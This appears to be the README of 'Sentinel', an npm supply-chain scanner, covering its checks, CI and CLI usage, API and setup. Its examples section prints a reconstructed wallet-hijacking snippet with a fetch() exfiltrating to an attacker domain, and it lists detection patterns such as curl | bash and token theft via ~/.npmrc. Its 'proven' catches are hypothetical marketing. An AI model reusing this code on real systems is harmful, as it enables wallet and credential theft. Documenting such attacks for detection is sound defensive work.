# 🛡️ Sentinel - Supply Chain Security Guardian

**Catch malicious npm packages before they destroy your project.**

---

## Table of Contents

1. [What is Sentinel?](#what-is-sentinel)
2. [The Problem & Solution](#the-problem--solution)
3. [How It Works: 4 Security Checks](#how-it-works-4-security-checks)
4. [Two Ways to Use Sentinel](#two-ways-to-use-sentinel)
5. [The Verdict System](#the-verdict-system)
6. [Real-World Examples](#real-world-examples)
7. [Architecture Overview](#architecture-overview)
8. [Quick Start](#quick-start)
9. [Database Selection Guide](#database-selection-guide)
10. [Setup Guide - SQLite (Development)](#setup-guide---sqlite-development)
11. [Setup Guide - Supabase (Production)](#setup-guide---supabase-production)
12. [Configuration](#configuration)
13. [API Reference](#api-reference)
14. [Dashboard Guide](#dashboard-guide)
15. [Troubleshooting](#troubleshooting)
16. [Best Practices](#best-practices)
17. [FAQ](#faq)
18. [Success Metrics](#success-metrics)
19. [Roadmap & Next Steps](#roadmap--next-steps)

---

## What is Sentinel?

Sentinel is a **zero-trust security scanner** that analyzes **npm** dependencies for supply chain attacks **before installation**. It uses 4 automated security checks powered by AI to block malicious packages and explain the verdict to developers.

Unlike traditional security tools that scan *after* compromise, Sentinel protects *before* anything runs.

> **Scope (Phase 1)**: Sentinel currently scans **direct dependencies** listed in your `package.json`. Transitive dependencies (packages that your packages depend on) are not yet scanned — this is planned for Phase 2. Python (`requirements.txt`) and Ruby (`Gemfile.lock`) support is on the roadmap for Q3–Q4 2026.

### Key Features

| Feature | Benefit |
|---------|---------|
| **GitHub Action** | Zero setup—works on every PR |
| **CLI Tool** | Scan before you install, no setup needed |
| **4 Security Checks** | Script diffs, code analysis, author reputation, AI reasoning |
| **Auto-blocking** | Fail CI if verdict is BLOCK |
| **Dark Dashboard** | SOC-style UI for security teams |
| **Flexible Database** | Choose SQLite (dev) or Supabase (prod) |
| **Explains Verdicts** | AI-powered reasoning for why packages are flagged |

---

## The Problem & Solution

### The Problem

The npm ecosystem faces unprecedented supply chain attacks:

- **September 2025**: Shai-Hulud worm compromised 500+ packages, stealing cloud credentials
- **March 2026**: Axios (100M downloads/week) hijacked for data exfiltration
- **December 2023**: Ledger Connect Kit stole $600K in crypto
- **Q4 2025**: 120,612 malware attacks blocked in a single quarter
- **Daily threat**: Log4Shell style vulnerabilities, typosquatting, compromised maintainers

**Root cause**: Developers install packages without knowing if they're safe. By the time a compromise is discovered, it's already in production.

### The Solution

Sentinel catches dangerous packages **before merge** by:
- 🔎 Analyzing every dependency change with 4 automated checks
- 🛑 Blocking malicious updates automatically
- 📊 Storing full audit trail for compliance
- 🎯 Explaining *why* it blocked (AI-powered reasoning)
- ⚡ Protecting *before installation*, not after

---

## How It Works: 4 Security Checks 🔍

When Sentinel scans a package, it runs **4 automated checks**:

### 1️⃣ Script Diff Analysis

**Question**: Does this package hide malicious code in install scripts?

**How it works**:
- Extracts install scripts from old & new versions
- Compares them line-by-line
- Flags new obfuscated code, external downloads, or data exfiltration patterns
- Red flags: `curl | bash`, `process.env` access, `dns.lookup()`, `child_process.exec()`

**Detects**:
- New bash scripts that download & execute code
- `curl | bash` patterns (immediate red flag)
- Suspicious access to environment variables
- Cryptocurrency mining operations
- Process spawning (executing arbitrary commands)

**Verdict**:
- ✅ **PASS**: No install scripts detected or benign updates
- ⚠️ **WARN**: New scripts that seem suspicious but could be legitimate
- 🚫 **BLOCK**: Obvious malicious patterns (crypto mining, data theft)

---

### 2️⃣ Code Analysis

**Question**: Does the code try to steal secrets or exfiltrate data?

**How it works**:
- Parses JavaScript source code (minified & obfuscated)
- Scans for patterns:
  - API key / credential access (`process.env.API_KEY`, `.aws/credentials`)
  - Clipboard hijacking (crypto address swapping)
  - Unauthorized HTTP requests to suspicious domains
  - Obfuscated base64/crypto operations on sensitive data
  - Database credential file access
  - Exfiltration: HTTP requests to unknown domains
  - Cryptography: Mining operations, encoding/decoding secrets
- Tracks data flow (where does it come from? where does it go?)

**Verdict**:
- ✅ **PASS**: No suspicious data access or transmission
- ⚠️ **WARN**: Code reads env vars but doesn't exfil (might be legitimate)
- 🚫 **BLOCK**: Clear data exfiltration patterns detected

---

### 3️⃣ Author Reputation

**Question**: Is the person who published this package trustworthy?

**How it works**:
- Queries npm registry for package maintainer info
- Checks:
  - **Publishing history**: How long has this author been active?
  - **Activity patterns**: Sudden spike after dormancy = account takeover
  - **Security practices**: 2FA enabled on npm account?
  - **Known compromises**: Is this account on a blacklist?
  - **Maintenance patterns**: Are they actively maintaining other packages?
  - **Takeover signals**: 
    - Sudden activity spike after dormancy
    - Publishing multiple packages in short time
    - Different IP geolocation than usual
  - **Registry flags**: 2FA enabled? Email verified?

**Verdict**:
- ✅ **PASS**: Established author, consistent history, security best practices
- ⚠️ **WARN**: Account shows signs of compromise (unusual activity pattern)
- 🚫 **BLOCK**: New account, multiple red flags, or known compromised maintainer

---

### 4️⃣ AI Analysis (Google Gemini)

**Question**: What's the final verdict?

**How it works**:
- Google's Gemini AI analyzes all 4 checks above
- Generates human-readable explanation
- Considers context: Is this a major version bump (expected changes)? Is the package widely used?
- Outputs final verdict + confidence score (0-100%)

**AI features**:
- Analyzes complex attack patterns
- Considers context (major version bump = expected changes)
- Generates human-readable reasoning
- Outputs final verdict + confidence score (0-100%)

**Verdict**:
- ✅ **PASS** (90%+): All signals green, safe to merge
- ⚠️ **WARN** (40-90%): Mixed signals, review recommended
- 🚫 **BLOCK** (<40%): High risk, block the PR

---

## Two Ways to Use Sentinel

### 🔴 For Teams: GitHub Action on Pull Requests

When a team member raises a PR that updates dependencies, Sentinel automatically scans them.

**Workflow**:
```
1. Dev raises PR: "Update lodash to 4.17.21"
   ↓
2. GitHub Action triggers automatically
   ↓
3. Sentinel scans package (2-5 seconds)
   ↓
4. Posts comment on PR with verdict
   ↓
5. If BLOCK: CI fails, merge is blocked
   If WARN: Team reviews before merging
   If PASS: Can proceed
```

**Setup** (one-time, 2 minutes):
```yaml
# .github/workflows/sentinel.yml
name: Sentinel Security Scan

on:
  pull_request:
    paths:
      - 'package.json'
      - 'package-lock.json'
      - 'yarn.lock'
      - 'pnpm-lock.yaml'

permissions:
  pull-requests: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: sentinel-security/sentinel-action@v1.2.3  # pin exact version, not @v1
        with:
          api-url: 'https://your-sentinel-api.com'
          github-token: ${{ secrets.GITHUB_TOKEN }}
          sentinel-api-key: ${{ secrets.SENTINEL_API_KEY }}  # required - see API Auth below
          fail-on-error: false   # if Sentinel API is down, don't block CI (fail-open)
          block-on-warn: false   # set true to treat WARN as blocking
```

> **Versioning**: Always pin to an exact version tag (e.g. `@v1.2.3`) rather than `@v1`. Floating major tags can receive breaking changes silently. Check [releases](https://github.com/sentinel-security/sentinel-action/releases) for the latest version.

> **Fail-open vs Fail-closed**: `fail-on-error: false` means if Sentinel's API is unreachable, the CI check passes (fail-open). This prevents API downtime from blocking all your PRs. Security still enforced when API is up. Set `fail-on-error: true` only if you require hard guarantees — and ensure your API has 99.9%+ uptime first.

**Example PR Comment**:
```
🛡️ Sentinel Security Scan: PASS

Confidence Score: 98%

What Sentinel Checked:
1. ✓ Script Diff - No malicious install scripts
2. ✓ Code Analysis - No data exfiltration
3. ✓ Author Reputation - Established maintainer (npm since 2014)
4. ✓ AI Analysis - All signals green

Verdict: Safe to merge ✅

View full scan → [link to dashboard]
```

**When it activates**: Every PR that modifies `package.json`, `package-lock.json`, `yarn.lock`, or `pnpm-lock.yaml`

**Who benefits**: Teams, open-source projects, enterprises with code review processes

---

### 🟢 For Solo Devs: CLI Before npm install

Solo developers get a complete security audit **before installing anything**.

**Workflow**:
```
1. Dev clones repo or starts new project
   ↓
2. Runs: npx sentinel check-all
   ↓
3. Sentinel scans all packages in 2-5 seconds
   ↓
4. Shows verdict in terminal
   ↓
5. If BLOCK: Dev removes the package
   If WARN: Dev reviews/updates package
   If PASS: Dev proceeds with npm install
```

**One-time setup**: None. Just run it.

```bash
# Clone any repo
$ git clone https://github.com/someone/amazing-project
$ cd amazing-project

# First command: scan dependencies
$ npx sentinel check-all

# If all PASS/WARN reviewed:
$ npm install
$ npm run build
$ npm start
```

**Example Terminal Output**:
```
🛡️  Sentinel Security Scan

Analyzing 47 packages from package.json...

Summary:
✅ PASS: 45 packages
⚠️  WARN: 1 package
🚫 BLOCK: 1 package

Verdict: ⛔ BLOCKED - Cannot proceed safely

Details:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

```
✅ PASS (45 packages):
  ✓ react@18.2.0 (98% confidence)
  ✓ lodash@4.17.21 (99% confidence)
  ✓ express@4.18.2 (96% confidence)
  ... [42 more]

⚠️  WARN (1 package):
  ⚠️  some-old-lib@2.0.0 (68% confidence)
     • Author inactive 18 months
     • Recommend upgrading to v3.0.0
     • No critical issues detected
     View full report: sentinel.dev/pkg/some-old-lib

🚫 BLOCK (1 package):
  🚫 sketchy-crypto-lib@1.0.0 (BLOCK - 8% confidence)
     • Account created 1 week ago
     • Published 50 packages in 24 hours
     • Install script contains obfuscated code
     • Detected crypto mining signature
     REMOVE IMMEDIATELY
     View full report: sentinel.dev/pkg/sketchy-crypto-lib

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Next steps:
1. ❌ Remove: sketchy-crypto-lib from package.json
2. ⚠️  Update: some-old-lib to v3.0.0
3. ✅ Then run: npm install

Dashboard: Save this scan at sentinel.dev/dashboard
```

**Supported ecosystems**:
- Node.js (Phase 1 — current): `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
- Python (Phase 2 — Q3 2026): `requirements.txt`, `Pipfile.lock`, `poetry.lock`
- Ruby (Phase 3 — Q4 2026): `Gemfile.lock`

> **Current scope**: Direct npm dependencies only. Transitive dependencies (e.g. a package your package depends on) will be added in Phase 2.

**Who benefits**: Solo developers, freelancers, small teams, indie hackers, open-source contributors

---

## The Verdict System

All scans return one of three verdicts:

### ✅ **PASS** (90%+ confidence)
- All 4 checks passed
- Zero security concerns detected
- Safe to install immediately

### ⚠️ **WARN** (40-90% confidence)
- Mixed signals detected
- Could be false positive or legitimate edge case
- **Requires developer review** before proceeding
- Examples:
  - Package reads env vars (might be intentional)
  - Author less established (but no other red flags)
  - Major version bump with code changes (expected)

### 🚫 **BLOCK** (<40% confidence)
- High-risk signals detected
- Likely malicious or compromised
- **Cannot proceed** (CI fails for teams, CLI exit code 1 for solo devs)
- Examples:
  - Install script with data exfiltration
  - New account with suspicious activity spike
  - Code that matches known malware signatures
  - Obfuscated code accessing credentials

---

## Real-World Examples

Would Sentinel have stopped these actual attacks? Here's the evidence.

### ✅ Ledger Connect Kit (December 2023) — Proven Detection

**Attack**: Attacker phished a Ledger contractor, pushed a malicious version of `@ledgerhq/connect-kit`. The injected code rewrote Web3 transaction links to drain wallets. Stole $600K in hours.

**The actual malicious code injected** (from public post-mortem):
```javascript
// Injected into connect-kit bundle (obfuscated, simplified here)
const _0x = function(a, b) { /* base64 decode layer */ };
if (window.ethereum) {
  const orig = window.ethereum.request.bind(window.ethereum);
  window.ethereum.request = async function(args) {
    if (args.method === 'eth_sendTransaction') {
      args.params[0].to = "0xAttackerWalletAddress"; // swap recipient
    }
    return orig(args);
  };
}
// Exfil: sends wallet address to attacker domain
fetch('https://ledger-live[.]io/collect?w=' + accounts[0]);
```

**How Sentinel catches it — check by check**:

| Check | Signal | Detail |
|-------|--------|--------|
| Script Diff | 🚫 BLOCK | New `postinstall` script appeared in version diff — didn't exist in prior version |
| Code Analysis | 🚫 BLOCK | `window.ethereum.request` monkey-patched + `fetch()` to unknown external domain |
| Author Reputation | ⚠️ WARN | Established author (Ledger) — but sudden publish at unusual hour (3AM CET), single commit |
| AI Analysis | 🚫 BLOCK | "DOM API interception + external exfiltration = Web3 transaction hijacking pattern" |

**Verdict**: 🚫 **BLOCK (3% confidence)**

**Result**: PR blocked before merge. $600K protected.

---

### ✅ Shai-Hulud Worm (September 2025)

**Attack**: Install script contained obfuscated worm that spread to other packages and stole npm tokens.

**Key signals Sentinel detects**:
- `postinstall` script added (not present in prior version)
- Script contains `base64` decode + `eval()` — classic obfuscation pattern
- Decoded payload: reads `~/.npmrc` (npm token) + sends via `dns.lookup()` to attacker domain

**Sentinel Checks**:
- 🚫 Script Diff: NEW install script with `eval(Buffer.from(...,'base64').toString())`
- 🚫 Code Analysis: `fs.readFileSync('~/.npmrc')` + `dns.lookup()` exfil
- 🚫 Author Reputation: Package maintainer account showed 14-month dormancy → sudden activity
- 🚫 AI Analysis: "Credential theft via obfuscated install hook"

**Verdict**: 🚫 **BLOCK (2% confidence)**

---

### ✅ Axios Hijacking (March 2026)

**Attack**: Malicious crypto-dependency injected to capture user data via RAT.

**Sentinel Checks**:
- 🚫 Script Diff: New crypto-dependency in install scripts
- 🚫 Code Analysis: RAT (Remote Access Trojan) patterns — persistent socket connection to external IP
- ⚠️ Author Reputation: Unusual account activity (multiple rapid publishes)
- 🚫 AI Analysis: "Remote access trojan: persistent outbound connection on install"

**Verdict**: 🚫 **BLOCK (3% confidence)**

---

## Architecture Overview

### System Diagram

```
┌─────────────────────────────────────────────┐
│                 Two Entry Points            │
└─────────────────────────────────────────────┘
         │                          │
         │                          │
    GitHub Action              CLI Tool
    (Teams on PRs)          (Solo Devs)
         │                          │
         └─────────┬────────────────┘
                   │
                   ▼
    ┌──────────────────────────────────┐
    │  Sentinel Backend API            │
    │  (Orchestrates 4 checks)         │
    └──────────────────────────────────┘
         │      │      │       │
         │      │      │       │
         ▼      ▼      ▼       ▼
    Script  Code   Author   Gemini
    Diff    Analysis  Rep    AI
    Check   Check   Check   Analysis
         │      │      │       │
         └──────┴──────┴───────┘
              │
              ▼
    ┌──────────────────────────┐
    │  Verdict + Confidence    │
    │  PASS/WARN/BLOCK         │
    └──────────────────────────┘
         │            │
         │            │
    Returns to    Returns to
    GitHub Action CLI Tool
    (Comments PR) (Terminal)
         │            │
         │            │
    ✅ Blocks   ✅ Guides
    dangerous   solo dev
    merges      decisions
```

### Detailed System Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    GitHub (Pull Request)                     │
└────────────────────────┬──────────────────────────────────────┘
                         │
                    (on package.json change)
                         │
┌────────────────────────▼──────────────────────────────────────┐
│                   GitHub Action                               │
│  • Detects package.json changes                               │
│  • Extracts old & new versions                                │
│  • Sends to Sentinel API                                      │
└────────────────────────┬──────────────────────────────────────┘
                         │
                         │ POST /api/scans
                         │
┌────────────────────────▼──────────────────────────────────────┐
│              Sentinel Backend API (Node.js)                   │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ Scanner Engine                                            │ │
│  │  ├─ Script Diff Analyzer                                 │ │
│  │  ├─ Code Static Analysis                                 │ │
│  │  ├─ npm Maintainer Reputation Lookup                     │ │
│  │  └─ Gemini AI Reasoning                                  │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ Database Layer (SQLite or Supabase)                      │ │
│  │  ├─ scans table (history, verdicts, confidence)          │ │
│  │  └─ signals table (detailed check results)               │ │
│  └──────────────────────────────────────────────────────────┘ │
└────────────┬──────────────────────┬──────────────────────────┘
             │                      │
        Returns verdict         Saves history
             │                      │
┌────────────▼──────────────┐ ┌────▼─────────────────────────────┐
│  GitHub (Post Comment)    │ │   Dashboard (React + Dark Theme) │
│  ✅ PASS                  │ │   • Recent scans                  │
│  ⚠️ WARN                  │ │   • Verdicts & confidence         │
│  🚫 BLOCK + PR blocked    │ │   • Top risky packages            │
└────────────────────────────┘ │   • Detailed scan timeline       │
                               └──────────────────────────────────┘
```

---

## Quick Start

### 1. Local Development (5 minutes)

```bash
# Clone the repo
git clone <your-repo>
cd sentinel
npm install

# Set environment variables
cp .env.example .env

# Edit .env and choose your database (see step 3 below)

# Initialize database (SQLite or Supabase - see guides below)

# Start the API
npm run dev

# In another terminal, start the dashboard
cd dashboard
npm run dev
```

**Visit**: `http://localhost:3000` (dashboard), `http://localhost:5000` (API)

---

### 2. GitHub Action Setup (2 minutes)

Add to your repo's `.github/workflows/sentinel.yml`:

```yaml
name: Sentinel Security Scan

on:
  pull_request:
    paths:
      - 'package.json'
      - 'package-lock.json'
      - 'yarn.lock'

permissions:
  pull-requests: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: sentinel-security/sentinel-action@v1
        with:
          api-url: 'https://your-sentinel-api.com'
          github-token: ${{ secrets.GITHUB_TOKEN }}
```

That's it. Sentinel now scans every PR that changes dependencies.

---

## Database Selection Guide

### Choose Your Database

| Feature | SQLite | Supabase |
|---------|--------|----------|
| **Best for** | Local dev, testing | Production, teams |
| **Setup time** | 30 seconds | 5 minutes |
| **File size** | Single `.db` file | Cloud-hosted |
| **Backups** | Manual | Automatic daily |
| **Free tier** | Unlimited | 500MB + 1GB transfer |
| **Scaling** | ≤100K rows | ∞ |
| **Cost at scale** | $0 | ~$25/mo or pay-per-use |
| **Team access** | ❌ (file-based) | ✅ (web dashboard) |
| **Data residency** | Local | Google Cloud |

### Decision Tree

```
Are you running locally for testing?
├─ YES → Use SQLite (easiest, zero config)
│
Are you deploying to production?
├─ YES → Use Supabase (automated backups, team access)
│
Do you need audit trail accessible to multiple developers?
├─ YES → Use Supabase (web dashboard, permissions)
├─ NO → Use SQLite (simpler)
│
Do you have privacy/data residency requirements?
├─ YES → Use SQLite (data stays local)
├─ NO → Supabase is fine
```

---

## Setup Guide - SQLite (Development)

**Perfect for**: Local testing, CI/CD testing, proof-of-concept

### Step 1: Get a Gemini API Key

1. Go to [Google AI Studio](https://aistudio.google.com/app/apikey)
2. Click "Get API Key"
3. Create new API key
4. Copy the key

**Free tier limits**:
- Gemini 2.5 Flash: 1,000 requests/day
- Perfect for development

### Step 2: Clone & Install

```bash
git clone https://github.com/yourusername/sentinel.git
cd sentinel
npm install
```

### Step 3: Setup Environment

```bash
cp .env.example .env
```

Edit `.env`:
```bash
DB_TYPE=sqlite
DB_PATH=./data/sentinel.db
GEMINI_API_KEY=your_key_here
GITHUB_TOKEN=ghp_your_token
```

### Step 4: Initialize Database

```bash
mkdir -p data
npm run db:init
```

This creates `data/sentinel.db` with tables for scans and signals.

### Step 5: Start Development Server

```bash
npm run dev
```

**API running on**: `http://localhost:5000`

### Step 6: Test It

```bash
# In another terminal
curl -X POST http://localhost:5000/api/scans \
  -H "Content-Type: application/json" \
  -H "X-API-Key: sk_sentinel_your_key_here" \
  -d '{
    "packages": [
      { "name": "lodash", "old_version": "4.17.20", "new_version": "4.17.21" }
    ]
  }'
```

---

## Setup Guide - Supabase (Production)

**Perfect for**: Production deployment, team access, automated backups

### Step 1: Create Supabase Project

1. Go to [supabase.com](https://supabase.com)
2. Click "New Project"
3. Name: `sentinel`
4. Region: Choose closest to you
5. Create

### Step 2: Get Connection Credentials

1. Go to Project Settings → API
2. Copy **Project URL** (looks like `https://xxxxx.supabase.co`)
3. Copy **Service Role Key** (starts with `eyJhbGc...`)

⚠️ **Important**: Use **Service Role Key**, NOT Anon Key

### Step 3: Clone & Install

```bash
git clone https://github.com/yourusername/sentinel.git
cd sentinel
npm install
```

### Step 4: Setup Environment

```bash
cp .env.example .env
```

Edit `.env`:
```bash
DB_TYPE=supabase
SUPABASE_URL=https://xxxxx.supabase.co
SUPABASE_SERVICE_KEY=eyJhbGc...
GEMINI_API_KEY=your_key_here
GITHUB_TOKEN=ghp_your_token
```

### Step 5: Run Migrations

```bash
npm run db:migrate:supabase
```

This creates tables in your Supabase project.

### Step 6: Start Server

```bash
npm run dev
```

**API running on**: `http://localhost:5000`

### Step 7: Test It

```bash
curl -X POST http://localhost:5000/api/scans \
  -H "Content-Type: application/json" \
  -d '{
    "packages": [
      { "name": "react", "old_version": "18.0.0", "new_version": "18.2.0" }
    ]
  }'
```

---

## Configuration

### Environment Variables

```bash
# Database Type
DB_TYPE=sqlite|supabase

# SQLite Only
DB_PATH=./data/sentinel.db

# Supabase Only
SUPABASE_URL=https://xxxxx.supabase.co
SUPABASE_SERVICE_KEY=eyJhbGc...

# AI Analysis
GEMINI_API_KEY=your_key_here

# GitHub Integration
GITHUB_TOKEN=ghp_your_token

# API Auth (required — protects all endpoints)
SENTINEL_API_KEY=sk_sentinel_your_generated_key
# Generate: npm run generate-key

# API Server
PORT=5000
NODE_ENV=development|production

# Rate Limiting (optional overrides)
RATE_LIMIT_RPM=30          # requests per minute per key
RATE_LIMIT_RPD=1000        # requests per day per key
MAX_PACKAGES_PER_SCAN=50   # max packages in one POST /api/scans

# Optional: Logging
LOG_LEVEL=debug|info|warn|error
```

### Dashboard Configuration

```bash
# Dashboard (in dashboard/ directory)
REACT_APP_API_URL=http://localhost:5000
REACT_APP_DASHBOARD_TITLE=Sentinel Security
```

---

## API Reference

### Authentication

All API endpoints require an API key. Pass it in the `X-API-Key` header:

```bash
curl -H "X-API-Key: sk_sentinel_your_key_here" http://localhost:5000/api/scans
```

**Generating an API key**:
```bash
npm run generate-key
# Output: sk_sentinel_a1b2c3d4e5f6...
# Add to .env: SENTINEL_API_KEY=sk_sentinel_...
# Add to GitHub Secrets: Settings → Secrets → SENTINEL_API_KEY
```

Without a valid key, all endpoints return:
```json
{ "error": "Unauthorized", "status": 401 }
```

> **Note for GitHub Action**: Pass key via `sentinel-api-key: ${{ secrets.SENTINEL_API_KEY }}` in your workflow. Never hardcode keys in YAML files.

---

### Rate Limiting

Sentinel enforces rate limits to protect your Gemini quota:

| Limit | Value |
|-------|-------|
| Max packages per request | 50 |
| Requests per minute (per API key) | 30 |
| Requests per day (per API key) | 1,000 |

Exceeding limits returns:
```json
{ "error": "Rate limit exceeded. Retry after 60 seconds.", "status": 429 }
```

For higher limits, configure `RATE_LIMIT_RPM` in your `.env`.

---

### POST `/api/scans`

**Scan packages** and get verdict.

> **Max 50 packages per request.** Scanning more? Split into batches. Each package triggers a Gemini call — large batches = high cost + slow response.

**Request Body**:
```json
{
  "packages": [
    {
      "name": "lodash",
      "old_version": "4.17.20",
      "new_version": "4.17.21"
    },
    {
      "name": "react",
      "old_version": "18.0.0",
      "new_version": "18.2.0"
    }
  ],
  "repo": "user/project",
  "pr_number": 42
}
```

**Example**:
```bash
curl -X POST http://localhost:5000/api/scans \
  -H "Content-Type: application/json" \
  -H "X-API-Key: sk_sentinel_your_key_here" \
  -d '{ "packages": [...] }'
```

**Response** (200 OK):
```json
{
  "scan_id": "550e8400-e29b-41d4-a716-446655440000",
  "verdict": "WARN",
  "confidence_score": 72,
  "timestamp": "2025-05-23T10:30:00Z",
  "summary": "2 packages safe, 1 requires review",
  "signals": [
    {
      "check_type": "script_diff",
      "severity": "info",
      "message": "lodash: No script changes detected ✓"
    },
    {
      "check_type": "code_analysis",
      "severity": "info",
      "message": "react: Standard library updates, no suspicious patterns"
    },
    {
      "check_type": "author_reputation",
      "severity": "warning",
      "message": "sketchy-lib: New maintainer, account created 1 month ago"
    },
    {
      "check_type": "ai_analysis",
      "severity": "warning",
      "message": "New dependency from unestablished author. Recommend code review before merge."
    }
  ]
}
```

### GET `/api/scans`

**List recent scans** with filtering.

**Query Parameters**:
- `limit`: Number of scans (default: 50, max: 100)
- `repo`: Filter by repository
- `verdict`: Filter by verdict (PASS, WARN, BLOCK)
- `days`: Last N days (default: 30)

**Request**:
```bash
curl -H "X-API-Key: sk_sentinel_your_key_here" \
  'http://localhost:5000/api/scans?repo=user/project&verdict=BLOCK&limit=10'
```

**Response** (200 OK):
```json
{
  "scans": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "repo": "user/my-project",
      "pr_number": 42,
      "verdict": "BLOCK",
      "confidence_score": 15,
      "created_at": "2025-05-23T10:30:00Z"
    }
  ],
  "total": 145,
  "page": 1
}
```

### GET `/api/scans/:scan_id`

**Get detailed scan results**.

**Request**:
```bash
curl -H "X-API-Key: sk_sentinel_your_key_here" \
  'http://localhost:5000/api/scans/550e8400-e29b-41d4-a716-446655440000'
```

**Response** (200 OK):
```json
{
  "id": "550e8400-e29b-41d4-a716-446655440000",
  "repo": "user/my-project",
  "pr_number": 42,
  "verdict": "WARN",
  "confidence_score": 72,
  "created_at": "2025-05-23T10:30:00Z",
  "signals": [
    {
      "id": "signal-1",
      "check_type": "script_diff",
      "severity": "info",
      "result": { "changed": false }
    }
  ]
}
```

### GET `/api/stats`

**Dashboard statistics**.

```bash
curl -H "X-API-Key: sk_sentinel_your_key_here" 'http://localhost:5000/api/stats'
```

**Response**:
```json
{
  "total_scans": 1234,
  "scans_this_week": 142,
  "verdict_breakdown": {
    "PASS": 1050,
    "WARN": 170,
    "BLOCK": 14
  },
  "risky_packages": [
    {
      "name": "sketchy-module",
      "blocked_count": 8,
      "verdict": "BLOCK"
    }
  ]
}
```

---

## Dashboard Guide

### What It Looks Like

```
┌─────────────────────────────────────────────────────────────────────┐
│  🛡️  SENTINEL                              [Settings]  [Logout]      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐   │
│  │  1,234   │  │   170    │  │    14    │  │   < 2.1s avg     │   │
│  │  Total   │  │  WARNs   │  │  BLOCKs  │  │   Scan Speed     │   │
│  │  Scans   │  │  (14%)   │  │   (1%)   │  │                  │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────────────┘   │
│                                                                     │
│  Recent Scans                                    [Filter ▼]        │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ ✅ PASS  lodash@4.17.21      user/my-app   PR#42  2min ago  │   │
│  │ ⚠️ WARN  some-lib@2.0.0     user/my-app   PR#41  1hr ago   │   │
│  │ 🚫 BLOCK sketchy-mod@1.0.0  user/my-app   PR#40  3hr ago   │   │
│  │ ✅ PASS  react@18.3.0       org/frontend  PR#88  5hr ago   │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  Top Risky Packages (Last 30 days)                                  │
│  sketchy-module    ████████████  8 blocks                          │
│  crypto-stealer    ██████        4 blocks                          │
│  fake-lodash       ████          3 blocks                          │
└─────────────────────────────────────────────────────────────────────┘
```

**Scan Detail** (click any scan):
```
┌──────────────────────────────────────────────────┐
│  🚫 BLOCK  sketchy-crypto-lib@1.0.0              │
│  Confidence: 8%  •  Scanned: 3 hours ago         │
│  Repository: user/my-app  •  PR #40              │
├──────────────────────────────────────────────────┤
│  Check Results                                   │
│  ├─ 🚫 Script Diff     obfuscated postinstall    │
│  ├─ 🚫 Code Analysis   crypto miner detected     │
│  ├─ 🚫 Author Rep      account 1 week old        │
│  └─ 🚫 AI Analysis     "Clear mining malware"    │
├──────────────────────────────────────────────────┤
│  AI Reasoning                                    │
│  "New account published 50 packages in 24 hours. │
│   Install script decodes base64 payload and      │
│   executes crypto miner. Matches known attack    │
│   pattern. Block immediately."                   │
├──────────────────────────────────────────────────┤
│  [View Raw JSON]  [Report False Positive]        │
└──────────────────────────────────────────────────┘
```

### Overview Page

- **Recent Scans**: Last 10 scans with verdicts
- **Stats Summary**: Total, breakdown by verdict
- **Top Risky Packages**: Most-blocked dependencies
- **Alerts**: Last 24 hours of scans

### Scan Detail Page

1. **Verdict & Confidence**: Large PASS/WARN/BLOCK display
2. **Timeline**: 4 checks with results
3. **Affected Packages**: Version changes
4. **Raw JSON**: Full scan data

### Filtering

- By Repository
- By Verdict
- By Date Range
- By Author

### For Teams (GitHub Action)

- **What's saved**: Full scan results, verdict, all 4 signals, confidence score
- **Why**: Audit trail for compliance, trend analysis, security reports
- **Storage**: SQLite (development) or Supabase (production)
- **Dashboard**: View all scans, filter by verdict/repo, see trends

### For Solo Devs (CLI)

- **What's saved**: (Optional) Project scan history
- **Dashboard access**: Free account to view past scans
- **Privacy**: Personal scans stay private, aggregated stats public

---

## Troubleshooting

### SQLite Issues

> ⚠️ **Concurrency Warning**: SQLite allows only **one writer at a time**. If multiple GitHub Action runs trigger simultaneously (e.g., 3 PRs opened within seconds), writes will queue and some scans may time out or fail. **If your team opens more than 1-2 PRs per minute, use Supabase instead.** SQLite is for local development and solo use only.

**"SQLITE_CANTOPEN"**:
```bash
mkdir -p data
# Update DB_PATH in .env if needed
```

**"Database is locked"**:
```bash
# Caused by concurrent writes — SQLite only allows one writer at a time
# Fix 1: Ensure only one API instance is running
ps aux | grep "npm run dev"
# Fix 2: Switch to Supabase for team/concurrent use
```

### Supabase Issues

**"Connection refused"**:
- Is `SUPABASE_URL` correct? (should have https://)
- Is `SUPABASE_SERVICE_KEY` valid?
- Can you reach supabase.co from your network?

**"auth error"**:
- Double-check you're using **Service Role Key** (not Anon Key)
- Service Role Key starts with `eyJhbGc...`

**"table does not exist"**:
- Did you run the SQL migrations?
- Check Supabase → SQL Editor → Run migrations

### Gemini API Issues

**"API key invalid"**:
1. Go to [aistudio.google.com/app/apikey](https://aistudio.google.com/app/apikey)
2. Create new key
3. Update `.env` and restart

**"Rate limited"**:
- Free tier has limits (1,000 req/day for Flash)
- Wait 24 hours or upgrade to paid
- Check usage in Google AI Studio dashboard

### GitHub Action Issues

**"Action not posting comments"**:
- Add to workflow: `permissions: pull-requests: write`
- Is `github-token` passed correctly?

---

## Best Practices

### 1. Secure Your Keys

```bash
# Never commit .env
echo ".env" >> .gitignore

# Use GitHub Secrets for CI/CD
# Go to: Settings → Secrets and variables → Actions → New repository secret
```

### 2. Monitor Performance

- Average scan time: <5 seconds
- Database size growth: ~1MB per 1,000 scans
- Gemini API costs: ~$0.01-0.10 per scan

### 3. Regular Backups

**SQLite**:
```bash
# Daily backup
0 2 * * * cp /path/to/sentinel/data/sentinel.db /backups/
```

**Supabase**: Enabled automatically

### 4. Review WARN Verdicts

Don't ignore warnings—they often catch edge cases.

---

## FAQ

**Q: Can I run both SQLite and Supabase simultaneously?**
